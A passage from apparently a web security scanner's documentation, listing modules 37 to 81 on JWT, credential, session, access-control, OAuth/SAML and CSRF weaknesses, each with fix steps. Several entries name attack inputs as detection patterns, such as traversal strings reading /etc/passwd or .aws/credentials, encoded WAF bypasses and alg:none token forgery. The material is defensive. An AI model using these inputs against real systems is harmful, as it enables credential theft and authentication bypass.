**References:** [↗](https://owasp.org/www-community/attacks/Session_fixation) · [↗](https://cwe.mitre.org/data/definitions/384.html)

---

### 37. JWT Algorithm Confusion
**Module:** `jwt_algorithm_confusion` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-347**

alg:none tokens accepted by server — anyone can forge valid tokens without a key Algorithm confusion RS256→HS256 uses the public key as HMAC secret — full auth bypass kid path traversal (../../etc/passwd) allows forcing an arbitrary HMAC key

**How to fix:**
- Explicitly specify allowed algorithms server-side — reject alg:none unconditionally
- Use algorithm-specific verification libraries; never accept both symmetric and asymmetric algs
- Validate kid against a strict allowlist; reject any kid containing path traversal characters

---

### 38. JWT Algorithm Confusion / Weak Secret
**Module:** `jwt_advanced_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-347** &nbsp;|&nbsp; **MITRE:** T1550

Detects JWT with alg:'none' (signature verification bypass), JWT tokens in URL parameters (logged in access logs), decoded JWT payload logging, JWT payload exfiltration, and JWT signing with short/common secrets vulnerable to brute force.

**How to fix:**
- Explicitly whitelist allowed algorithms — reject alg:'none' always
- Never pass JWT tokens in URL parameters — use Authorization header or httpOnly cookies
- Never log decoded JWT payloads to console
- Use cryptographically random secrets of at least 256 bits for HMAC, or RSA/EC key pairs for asymmetric signing

**References:** [↗](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/) · [↗](https://cwe.mitre.org/data/definitions/347.html)

---

### 39. Hardcoded Credentials in Page JavaScript
**Module:** `hardcoded_credentials` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-798**

AWS Access Key in JS: attacker can provision infrastructure, exfiltrate S3 data, delete resources Stripe secret key in JS: attacker can charge cards, refund transactions, access customer data GitHub PAT in JS: attacker can access repositories, push malicious code, delete branches Slack token in JS: attacker can read all channel messages, impersonate the bot OAuth client secret in JS: attacker can impersonate the OAuth application, forge tokens Private key PEM in JS: attacker can decrypt traffic, forge signatures, authenticate as the server

**How to fix:**
- Remove all credentials from client-side JavaScript immediately and rotate exposed secrets
- Use server-side proxy endpoints that call external APIs with server-stored credentials
- Load secrets from environment variables at server runtime — never embed in client bundles
- Implement secret scanning in CI/CD (GitHub secret scanning, truffleHog, detect-secrets)
- Use API key restrictions (IP allowlist, HTTP referrer) for any client-side keys that are unavoidable

---

### 40. Credential Management API Misuse
**Module:** `credential_api_advanced` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-522** &nbsp;|&nbsp; **MITRE:** T1555

Detects plaintext password storage via credentials.store(), silent mediation auto-fill triggering unauthorized requests, credential data from URL parameters, and PasswordCredential/FederatedCredential object exfiltration.

**How to fix:**
- Use credentials.store() only for legitimate credential saving flows, never with URL-sourced data
- Avoid mediation:'silent' for sensitive operations — require explicit user interaction
- Never serialize PasswordCredential/FederatedCredential objects for transmission to analytics
- Validate all credential inputs before calling credentials.store()

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Credential_Management_API) · [↗](https://cwe.mitre.org/data/definitions/522.html)

---

### 41. Client-Side Authentication Bypass Pattern
**Module:** `auth_bypass_pattern_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-287** &nbsp;|&nbsp; **MITRE:** T1078

Detects auth bypass patterns including isAdmin/role read from URL parameters, authentication state from localStorage/sessionStorage, always-true boolean short-circuits (isAdmin || true), and hardcoded credential comparisons that enable trivial authentication bypass.

**How to fix:**
- Never derive isAdmin/isAuthenticated/role from URL parameters — validate server-side only
- Do not store authentication state in localStorage/sessionStorage — use httpOnly cookies and server sessions
- Avoid boolean short-circuit patterns in auth guards — use strict equality checks
- Never hardcode credentials or secrets in client-side code

**References:** [↗](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) · [↗](https://cwe.mitre.org/data/definitions/287.html)

---

### 42. Session Management Weakness
**Module:** `session_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-384**

Session fixation allows pre-setting a victim's token before authentication Predictable session IDs brute-forced to hijack active sessions Sessions not invalidated on logout allow reuse of stolen tokens indefinitely

**How to fix:**
- Regenerate session ID on every privilege escalation (login, role change)
- Use cryptographically random tokens with ≥128 bits of entropy
- Invalidate sessions server-side on logout; enforce idle + absolute timeouts

---

### 43. Session / Auth Token Exposure via URL or Body
**Module:** `session_token_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-598**

Token in URL query param: appears in server access logs, proxy logs, browser history — stolen by log access Token in Referer header: when user clicks external link, token sent to third-party in Referer header Bearer token in HTML body: JavaScript can read and exfiltrate via XSS; cached in browser history JSESSIONID/PHPSESSID in URL: Java/PHP default session URL rewriting leaks session to referrers JWT in localStorage link: persists across tabs, exfiltrated by any XSS on the domain

**How to fix:**
- Never put session tokens in URLs — use HTTP-only cookies or Authorization: Bearer header
- Set Referrer-Policy: no-referrer or same-origin to prevent token leakage via Referer
- Disable URL-based session tracking (jsessionid in URL) in application server config
- Store tokens in memory (JS variable) not localStorage if XSS risk is present
- Rotate tokens after authentication and set short expiry; invalidate on logout

**References:** [↗](https://cwe.mitre.org/data/definitions/598.html)

---

### 44. JWT Vulnerability
**Module:** `jwt_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-347**

alg:none attack allows forging tokens without a valid signature Algorithm confusion (RS256→HS256) uses the public key as HMAC secret — full auth bypass Weak HMAC secrets brute-forced offline to forge arbitrary tokens Missing exp claim allows tokens to remain valid indefinitely after compromise

**How to fix:**
- Explicitly allowlist accepted JWT algorithms — reject 'none' and unexpected algorithms
- Use ≥256-bit entropy for HMAC secrets; use asymmetric keys for RS256
- Verify exp and iat claims on every request; use short-lived tokens (≤15 min)

---

### 45. Advanced JWT Attacks
**Module:** `jwt_advanced` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-347**

JKU/X5U header injection redirects key verification to an attacker-controlled URL Embedded JWK attack injects a crafted public key that the server then trusts KID injection can be used for path traversal or SQL injection

**How to fix:**
- Ignore jku/x5u/jwk headers in JWT — only use pre-configured trusted keys
- Treat KID as an opaque identifier, never as a filename or SQL fragment

---

### 46. JWT Token Exposed or Weakly Signed
**Module:** `jwt_token_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-347**

alg:none JWT: no signature verification — attacker forges tokens by setting algorithm to none HMAC JWT in page body: if key is guessable or leaked, attacker generates valid tokens for any user JWT in URL parameter: token in server logs, browser history, Referer header — lateral theft JWT in localStorage: XSS exfiltrates token; persists across tabs; accessible to all page scripts HMAC symmetric key reuse: same secret for signing and verification — compromise of one service exposes all

**How to fix:**
- Reject tokens with alg:none — whitelist permitted algorithms (RS256, ES256 preferred over HS256)
- Use asymmetric signatures (RS256/ES256) so public keys can be distributed without exposing signing key
- Store JWTs in HttpOnly cookies, not localStorage or URL parameters
- Implement short expiry (access: 15 min, refresh: 24h) with rotation and revocation
- Use strong, randomly generated signing secrets (minimum 256-bit for HMAC-SHA256)

**References:** [↗](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

### 47. Magic Link Token Leakage / Weak Entropy
**Module:** `magic_link_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-330** &nbsp;|&nbsp; **MITRE:** T1528

Detects magic link tokens logged to console (visible to extensions), authentication tokens forwarded to analytics/third parties, short low-entropy tokens vulnerable to brute force, and token-from-URL patterns without server validation.

**How to fix:**
- Never log magic link tokens or email verification tokens to console
- Do not transmit authentication tokens to third-party analytics or tracking endpoints
- Use cryptographically random tokens of at least 128 bits (32+ hex chars or 22+ base64url chars)
- Validate magic link tokens server-side — never trust client-side validation alone

**References:** [↗](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) · [↗](https://cwe.mitre.org/data/definitions/330.html)

---

### 48. WebAuthn Credential Confusion / Downgrade
**Module:** `web_authentication_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-295** &nbsp;|&nbsp; **MITRE:** T1556

Detects WebAuthn attestation data exfiltration, clientDataJSON leakage, attacker-controlled rpId/challenge via URL parameters enabling credential confusion, and WebAuthn downgrade paths to weaker credential types.

**How to fix:**
- Only send WebAuthn authenticatorData and clientDataJSON to your own relying party server
- Never source rpId, challenge, or allowCredentials from URL parameters
- Disable password/federated fallback in credentials.get() when WebAuthn is required
- Validate that the rpId matches your registered domain before accepting any credential

**References:** [↗](https://www.w3.org/TR/webauthn-2/) · [↗](https://cwe.mitre.org/data/definitions/295.html)

---

### 49. Credential Management API Misuse
**Module:** `credential_management_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-522**

Hardcoded password in PasswordCredential: plaintext credential visible in JS source to any script on page Silent mediation without MFA check: credentials.get(mediation:'silent') re-authenticates without user awareness, bypassing MFA No preventSilentAccess() on logout: after logout, silent credential retrieval re-authenticates user without interaction Credential Management over HTTP: API requires HTTPS; HTTP deployment means credentials silently unavailable or exposed FederatedCredential without OAuth PKCE: implicit-flow federation via Credential Management inherits OAuth implicit flow risks

**How to fix:**
- Never pass hardcoded credentials to PasswordCredential — always use form-submitted values
- Call navigator.credentials.preventSilentAccess() on all logout/sign-out paths to disable auto-sign-in
- After mediation:'silent' credential retrieval, still verify the session server-side before granting access
- Ensure Credential Management API is only used over HTTPS — fail gracefully on HTTP
- Pair FederatedCredential with Authorization Code + PKCE flow rather than implicit flow

**References:** [↗](https://w3c.github.io/webappsec-credential-management/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Credential_Management_API)

---

### 50. Account Enumeration via Error Messages
**Module:** `account_enumeration_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-204** &nbsp;|&nbsp; **MITRE:** T1589

Detects different error messages for missing user vs wrong password, timing oracles in not-found code paths, real-time username/email existence check endpoints, and registration forms revealing account existence.

**How to fix:**
- Use identical error messages for 'user not found' and 'wrong password' (generic: 'Invalid credentials')
- Ensure consistent response times for existing vs non-existing accounts
- Avoid real-time checkEmail()/checkUsername() endpoints that confirm account existence
- Rate-limit registration and login endpoints to prevent automated enumeration

**References:** [↗](https://owasp.org/www-community/attacks/Username_Enumeration) · [↗](https://cwe.mitre.org/data/definitions/204.html)

---

## Authorization & Access Control

*18 scanners in this category.*

### 51. Broken Object Level Authorization (BOLA/IDOR)
**Module:** `broken_object_level_auth` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-639** &nbsp;|&nbsp; **MITRE:** T1083

Detects passive indicators of BOLA vulnerabilities: numeric object IDs in API paths without observed Authorization headers, sensitive fields (password, token, SSN) in API responses that should require per-object authorization, listing endpoints that expose total record counts suggesting missing ownership filters, and cross-user ID fields that can be substituted in request paths.

**How to fix:**
- Verify object ownership on every request — check that the authenticated user owns the requested object ID
- Use non-sequential, unguessable IDs (UUIDs) to prevent enumeration even if authorization is bypassed
- Never return sensitive fields (password hashes, tokens, SSNs) in API list or detail responses
- Implement authorization at the data layer, not just the route layer

**References:** [↗](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/) · [↗](https://cwe.mitre.org/data/definitions/639.html)

---

### 52. Path Traversal / Arbitrary File Read
**Module:** `path_traversal_deep` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-22**

?file=../../../etc/passwd returns passwd content: full system user enumeration, UID mapping ?path= with encoded sequences (..%2F, %252e): WAF bypass leads to arbitrary file read PHP source code returned via traversal: exposes credentials, DB passwords, application secrets Windows hosts file read: confirms OS type and internal network topology Error response leaks full server path: filesystem layout disclosed, aids targeted traversal

**How to fix:**
- Never construct file paths from user input — use a file ID mapped to server-side path allowlist
- Resolve canonical paths and verify they start with the expected base directory before opening
- Strip all traversal sequences including encoded variants (%2F, %252F, %c0%af) via allowlist, not blocklist
- Run application with least-privilege OS user — no access to /etc, /proc, or system directories
- Return generic error pages for missing files — never include the attempted path in the response

**References:** [↗](https://owasp.org/www-community/attacks/Path_Traversal) · [↗](https://cwe.mitre.org/data/definitions/22.html)

---

### 53. Broken Access Control
**Module:** `access_control` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-284**

IDOR allows accessing other users' records by manipulating object identifiers Privilege escalation by accessing admin endpoints without authorization Mass assignment overwrites security-critical fields (is_admin, role, balance)

**How to fix:**
- Enforce authorization server-side on every request — never trust client-side controls
- Use UUIDs instead of sequential integer IDs for resource identifiers
- Implement allowlisting for mass assignment — explicitly list safe fields

---

### 54. Exposed Admin Interface
**Module:** `admin_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-284**

Public admin panels targeted by credential stuffing and password spraying Default or weak admin credentials give full application control to attackers Admin panels typically bypass normal authorization checks

**How to fix:**
- Restrict admin interfaces to VPN/internal IP ranges at the network layer
- Require MFA for all admin access
- Use separate authentication domains for admin vs. regular user access

---

### 55. Insecure Direct Object Reference (IDOR)
**Module:** `insecure_direct_object_reference` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-639** &nbsp;|&nbsp; **MITRE:** T1078

Detects IDOR patterns where userId/accountId/recordId values from URL parameters are used directly in API calls without visible authorization checks, sequential numeric IDs from URL parameters enable enumeration, and internal object IDs are exfiltrated to third-party analytics endpoints.

**How to fix:**
- Always verify server-side that the authenticated user owns the requested object
- Use opaque, non-sequential identifiers (UUIDs) rather than integer primary keys in URLs
- Never derive user/account/record IDs from URL parameters without ownership validation
- Audit all API endpoints that accept object IDs for missing authorization checks

**References:** [↗](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References) · [↗](https://cwe.mitre.org/data/definitions/639.html)

---

### 56. Mass Assignment Vulnerability
**Module:** `mass_assignment_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-915** &nbsp;|&nbsp; **MITRE:** T1078

Detects unrestricted object property assignment from user-controlled input including spread operators on URL parameters/JSON.parse, Object.assign() merging req.body/searchParams into model objects, for...in loops over user input assigning to model properties, and role/isAdmin/permission values derived from user-supplied data.

**How to fix:**
- Use explicit allowlists of permitted fields when assigning user input to models
- Never use Object.assign(model, req.body) — destructure only permitted fields
- Mark sensitive fields (role, isAdmin, permissions) as non-assignable/protected
- Use validation schemas (Joi, Zod) that reject unknown properties

**References:** [↗](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html) · [↗](https://cwe.mitre.org/data/definitions/915.html)

---

### 57. Business Logic Exposure
**Module:** `business_logic_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-840**

Price/quantity fields manipulable client-side allow purchasing at attacker-set prices Mass assignment vulnerabilities allow setting is_admin, role, or verified fields directly Admin API endpoints accessible without admin authentication

**How to fix:**
- Never trust client-supplied price or quantity — recalculate all values server-side
- Implement an explicit allowlist of user-settable fields; block is_admin, role, permission
- Require role-based access control checks on every admin API endpoint

---

### 58. Path Traversal
**Module:** `path_traversal` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-22**

../../etc/passwd, /proc/self/environ read server OS files and environment secrets Source code disclosure if web root paths are traversable Credential files (/etc/shadow, .env, .aws/credentials) exposed

**How to fix:**
- Canonicalize paths with realpath() and verify they fall within an allowed base directory
- Never pass user input directly to filesystem APIs
- Chroot or containerize the service to limit filesystem scope

---

### 59. Path Normalization Bypass
**Module:** `path_normalization_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-22**

URL-encoded dot sequences (%2e%2e%2f) bypass path validation and access restricted files Double-slash sequences confuse reverse proxies, allowing admin endpoint bypass Unicode normalization attacks (fullwidth characters) bypass WAF rules

**How to fix:**
- Normalize and canonicalize all URL paths before access control checks
- Reject requests with encoded dot sequences (%2e, %2f) in path segments
- Ensure reverse proxy and application agree on path normalization rules

---

### 60. Exposed Backup / Temporary Files
**Module:** `exposed_backup_files` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-530**

config.php.bak or wp-config.php~ exposes database credentials in plaintext .git/config reveals repository URL, author info, and potentially embedded credentials dump.sql or database.sql exposes full database contents including password hashes Source archives (backup.zip, site.tar.gz) expose entire application source code Editor swap files (.swp) contain partial source code with potential credential patterns

**How to fix:**
- Add deny rules for backup extensions (.bak, .orig, .old, ~, .swp) in web server config
- Use .htaccess or nginx location blocks to return 404 for backup extensions
- Implement pre-deployment checks to ensure no backup files exist in web root
- Move sensitive config files outside the web root; use environment variables for secrets
- Periodically run: find /var/www -name '*.bak' -o -name '*~' to catch lingering files

---

### 61. Client-Side Rate Limit Bypass Pattern
**Module:** `rate_limit_bypass_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-799** &nbsp;|&nbsp; **MITRE:** T1110

Detects rate limit bypass patterns including X-Forwarded-For/X-Real-IP header values from URL parameters, client-side attempt counters in localStorage/sessionStorage, and rateLimit configuration values from URL parameters that allow attackers to bypass server-side rate limiting.

**How to fix:**
- Never trust X-Forwarded-For or X-Real-IP headers for rate limiting — use the direct TCP connection IP
- Implement rate limiting server-side with server-managed counters, not client storage
- Do not configure rate limits from URL parameters — use server-side configuration
- Log and alert on repeated requests with modified IP headers

**References:** [↗](https://owasp.org/www-community/attacks/Denial_of_Service) · [↗](https://cwe.mitre.org/data/definitions/799.html)

---

### 62. API Pagination Abuse / Mass Data Extraction
**Module:** `api_pagination_abuse` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-770**

Unlimited page size: limit=99999 dumps entire database table in one unauthenticated request Total count disclosure: reveals exact dataset size, enabling targeted scraping strategies Cursor-based bypass: sequential cursor enumeration extracts all records without pagination No rate limiting on pagination: automated scrapers can dump millions of records undetected Offset enumeration: offset=0,1000,2000... extracts entire user table including PII

**How to fix:**
- Enforce maximum page size server-side (e.g., max 100 records per request, default 20)
- Reject or cap requests exceeding the maximum; never silently return all records
- Avoid exposing total count in responses where dataset enumeration is a risk
- Use opaque cursor tokens that cannot be guessed or incremented
- Apply rate limiting and authentication to all paginated API endpoints

**References:** [↗](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)

---

### 63. Directory Listing Enabled
**Module:** `directory_listing` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-548**

Reveals all files and directories in the web root — backup, config, and log files Enables targeted attacks against specific files discovered in the listing

**How to fix:**
- Disable directory listing: nginx autoindex off; Apache Options -Indexes
- Serve only files that explicitly need to be web-accessible

---

### 64. Deprecated API Versions Active
**Module:** `api_versioning` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-1104**

Old API versions with known security vulnerabilities remain accessible Security fixes on v3 may not be backported to v1/v2 Deprecated endpoints may have weaker or absent authentication requirements

**How to fix:**
- Return 410 Gone on all decommissioned API version paths
- Ensure all security controls on current versions apply equally to all active versions

---

### 65. API Versioning Security
**Module:** `api_versioning_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-1104**

Deprecated API versions (v1, v2) remain accessible with weaker security controls Version downgrade via Accept or X-API-Version header bypasses security controls on newer versions Unversioned /api/* endpoints bypass version-specific security middleware

**How to fix:**
- Decommission deprecated API versions: return 410 Gone and remove routes
- Apply security middleware uniformly across all active versions
- Reject or redirect version downgrade attempts via Accept / X-API-Version header

---

### 66. Missing Rate Limiting
**Module:** `rate_limit` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-770**

Auth endpoints without rate limiting vulnerable to credential stuffing API endpoints without rate limiting susceptible to DoS via resource exhaustion

**How to fix:**
- Implement rate limiting on all authentication endpoints with exponential backoff
- Use Redis-backed distributed rate limiting for horizontally scaled services
- Add CAPTCHA after threshold of failed attempts

---

### 67. Missing Rate Limiting on Auth Endpoints
**Module:** `rate_limiting_detection` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-307**

Authentication endpoints without rate limiting allow unlimited credential stuffing attempts Password reset endpoints without rate limiting enable enumeration and DoS Missing 429 Too Many Requests response on repeated auth failures confirms no protection

**How to fix:**
- Implement rate limiting (e.g., 5 req/min) on all login, registration, and password-reset paths
- Return 429 with Retry-After header on rate limit breach; add CAPTCHA after threshold
- Use distributed rate limiting (Redis/Memcached) for horizontally-scaled deployments

---

### 68. Missing or Misconfigured API Rate Limit Headers
**Module:** `api_rate_limit_headers` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-770** &nbsp;|&nbsp; **MITRE:** T1498

Detects API endpoints that lack RateLimit/X-RateLimit response headers, or serve these headers with dangerous values: a limit of 0 (unlimited), Retry-After of 0 (no backoff), or conflicting namespaces between proxy and origin. Without proper rate-limit headers, brute-force and enumeration attacks are unsignalled to clients and intermediaries.

**How to fix:**
- Add RateLimit-Limit, RateLimit-Remaining, and RateLimit-Reset headers to all API responses
- Never set RateLimit-Limit to 0; use a positive integer reflecting the actual throttle window
- Set Retry-After to a meaningful delay (e.g., 60 seconds) when returning 429 responses
- Standardise on one rate-limit header namespace (IETF draft or X-RateLimit) across proxy and origin

**References:** [↗](https://tools.ietf.org/html/draft-ietf-httpapi-ratelimit-headers) · [↗](https://cwe.mitre.org/data/definitions/770.html)

---

## OAuth, SAML & Identity

*10 scanners in this category.*

### 69. FedCM Token Forwarding / IdP Injection
**Module:** `federated_identity_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-601** &nbsp;|&nbsp; **MITRE:** T1556

Detects FedCM IdentityCredential token forwarding to unauthorized endpoints, attacker-controlled identity provider configURL from URL parameters, client ID injection, and static nonce enabling replay attacks.

**How to fix:**
- Only send FedCM identity tokens to your own authenticated server endpoint
- Hardcode the FedCM configURL — never source from URL parameters or user input
- Hardcode the FedCM clientId — never allow injection from URL parameters
- Use cryptographically random, single-use nonces in every FedCM identity request

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/FedCM_API) · [↗](https://cwe.mitre.org/data/definitions/601.html)

---

### 70. Identity Credential Security
**Module:** `identity_credential_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-359**

Digital Identity Credential API misuse — IdentityCredential token/claims transmitted to unauthorized remote endpoint, digital credential provider URL from URL parameter (attacker-controlled identity provider), silent credential presentation without user awareness, PII fields (name/email/DOB/national_id) exfiltrated.

**How to fix:**
- Do not transmit IdentityCredential tokens or claims to unauthorized endpoints or analytics
- Never configure digital credential provider URLs from URL parameters or user input
- Avoid mediation:silent for digital credential requests — require explicit user interaction
- Audit all IdentityCredential field access to prevent PII exfiltration

**References:** [↗](https://wicg.github.io/digital-credentials/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 71. OAuth Implicit Flow Token Leakage
**Module:** `oauth_implicit_flow` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-384**

access_token in URL fragment (#access_token=): logged by servers, leaked via Referer, visible in browser history Implicit flow with long-lived token: no refresh token mechanism means longer exposure window Fragment token accessible to JS: any XSS on redirect_uri page exfiltrates token from window.location.hash Token replay: implicit tokens without binding can be replayed from different IP/device Discovery advertises implicit grant: clients may use it — enables token fragment attacks

**How to fix:**
- Migrate from implicit flow (response_type=token) to authorization_code+PKCE
- Remove 'implicit' from grant_types_supported in OAuth discovery document
- Use short-lived access tokens with refresh token rotation for SPA flows
- Implement token binding or DPoP (Demonstration of Proof-of-Possession)
- Set redirect_uri allowlist to prevent token delivery to attacker-controlled origins

**References:** [↗](https://oauth.net/2/grant-types/implicit/) · [↗](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

---

### 72. OAuth Redirect URI Misconfiguration
**Module:** `oauth_redirect_uri_validation` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-601**

Loose redirect_uri validation allows token theft to attacker-controlled domains Missing state parameter in OAuth flows enables CSRF-based account linking attacks Authorization code theft via Referer header when redirect_uri includes sensitive data

**How to fix:**
- Require exact redirect_uri matching in the authorization server — no wildcards or partial matches
- Generate and validate a cryptographically random state parameter on every OAuth flow
- Register only specific redirect URIs; reject any unregistered URI at authorization time

---

### 73. OAuth 2.0 Implementation Misconfiguration
**Module:** `oauth_misconfiguration_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346** &nbsp;|&nbsp; **MITRE:** T1539

Detects OAuth 2.0 implementation flaws: access tokens in URL query strings (logged by web servers, proxies, browser history, and Referer headers), client_secret returned in API responses (allows impersonation of the application), implicit flow (response_type=token/id_token — deprecated in OAuth 2.1; tokens exposed in URL fragments), and overly broad scopes (wildcard * grants full access on token compromise).

**How to fix:**
- Always transmit access tokens in Authorization header, never in URLs
- Never return client_secret to clients; store securely server-side only
- Migrate from implicit flow to authorization code flow with PKCE
- Request minimal scopes; never use wildcard scope
- Validate redirect_uri against a strict allowlist

**References:** [↗](https://oauth.net/2/security-best-current-practice/) · [↗](https://cwe.mitre.org/data/definitions/346.html)

---

### 74. SAML Response Vulnerability
**Module:** `saml_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-347**

SAML comment injection bypasses signature validation by inserting comments into NameID Weak signature algorithms (MD5, SHA1) in SAML assertions allow signature forging Unsigned SAML assertions accepted — identity claims can be tampered by attacker

**How to fix:**
- Validate SAML XML canonically before signature check; reject any comment nodes in assertions
- Enforce SHA-256 or stronger for SAML assertion signatures
- Reject unsigned assertions; pin the IdP signing certificate to prevent key substitution

---

### 75. SAML Implementation Security Weaknesses
**Module:** `saml_security_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-347** &nbsp;|&nbsp; **MITRE:** T1550

Detects SAML implementation weaknesses: multiple Assertion elements with different IDs (XML Signature Wrapping attack — attacker wraps a malicious unsigned assertion around a signed one; signature validates while SP processes attacker's content), RSA-SHA1 signature algorithm (SHA-1 deprecated; SHAttered collision enables signature forgery), SAML library error messages in responses (reveals library version and enables targeted CVE attacks), and unspecified NameID format (allows arbitrary NameID values enabling account impersonation).

**How to fix:**
- Use a hardened SAML library with XSW protection (python3-saml, ruby-saml with patches, Spring Security SAML)
- Validate that the signed element is the element actually processed — check IDs and positions
- Require RSA-SHA256 or RSA-SHA512; reject SHA-1 signed assertions
- Use a specific NameID format (emailAddress or persistent) rather than unspecified

**References:** [↗](https://portswigger.net/web-security/saml) · [↗](https://cwe.mitre.org/data/definitions/347.html)

---

### 76. Fedcm Security
**Module:** `fedcm_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-287**

FedCM misuse — attacker-controlled configURL enables malicious IdP injection, IdentityCredential token exfiltrated, silent auto sign-in bypasses user consent, nonce from URL param enables replay attacks.

**How to fix:**
- Hardcode FedCM configURL — never derive from URL parameters or user input
- Do not transmit IdentityCredential tokens to third-party analytics endpoints
- Avoid mediation 'silent' unless absolutely necessary and with explicit user awareness
- Generate nonces server-side — never accept from client-side URL parameters

**References:** [↗](https://fedidcg.github.io/FedCM/) · [↗](https://cwe.mitre.org/data/definitions/287.html)

---

### 77. Trust Token Security
**Module:** `trust_token_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Private State Token (formerly Trust Token) misuse — token redemption result transmitted to remote (token-based cross-site tracking), token issuer configured from URL parameter (issuer manipulation), hasPrivateToken/hasTrustToken presence transmitted to analytics (binary cross-site tracking signal), forced redemption on page load.

**How to fix:**
- Do not transmit Private State Token redemption records to remote analytics or third-party servers
- Never configure token issuers from URL parameters or user-controlled input
- Audit hasPrivateToken()/hasTrustToken() usage to prevent presence-based cross-site tracking
- Only trigger token redemption in response to explicit user actions requiring trust verification

**References:** [↗](https://wicg.github.io/trust-token-api/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 78. Login Status Api Security
**Module:** `login_status_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-287**

Login Status API misuse — login state transmitted to remote servers for surveillance, setStatus('logged-in') triggered on page load (false state injection enabling FedCM bypass), login status controlled by URL parameter.

**How to fix:**
- Do not transmit navigator.login state to remote analytics or third-party servers
- Only call navigator.login.setStatus() in response to genuine authentication events
- Never derive login status from URL parameters — always use server-side authentication state
- Audit Login Status API usage for compliance with identity provider specifications

**References:** [↗](https://wicg.github.io/login-status/) · [↗](https://cwe.mitre.org/data/definitions/287.html)

---

## CSRF & Clickjacking

*8 scanners in this category.*

### 79. Weak CSRF Token
**Module:** `csrf_token_strength` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-352**

Short or low-entropy CSRF tokens brute-forceable in a reasonable number of requests SameSite=None without Secure flag allows CSRF token theft on non-HTTPS connections Predictable token sequences allow pre-computation of valid CSRF tokens

**How to fix:**
- Use cryptographically random CSRF tokens of at least 128 bits (32 hex chars)
- Set SameSite=Strict or SameSite=Lax on session cookies as defense-in-depth
- Never use SameSite=None without Secure; validate entropy on token generation

---

### 80. Weak CSRF Token / Double-Submit Cookie Bypass
**Module:** `csrf_double_submit` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-352**

Form without CSRF token: cross-site form POST succeeds — attacker triggers account changes Double-submit cookie readable from subdomain: attacker sets matching cookie/param pair Static CSRF token: value never rotates, token leak from one user enables CSRF for any session CSRF token in URL: value exposed via Referer header to third-party origins SameSite=None without CSRF token: cookies sent cross-origin enabling all form-based attacks

**How to fix:**
- Use synchronizer token pattern: server-generated, per-session, cryptographically random CSRF token
- Validate CSRF token on every state-changing request (POST, PUT, DELETE, PATCH)
- Do not use double-submit cookie pattern if subdomains are untrusted
- Set SameSite=Strict on session cookies as defense-in-depth (not sole protection)
- Rotate CSRF tokens after authentication and on each sensitive operation

**References:** [↗](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

### 81. Clickjacking (Advanced)
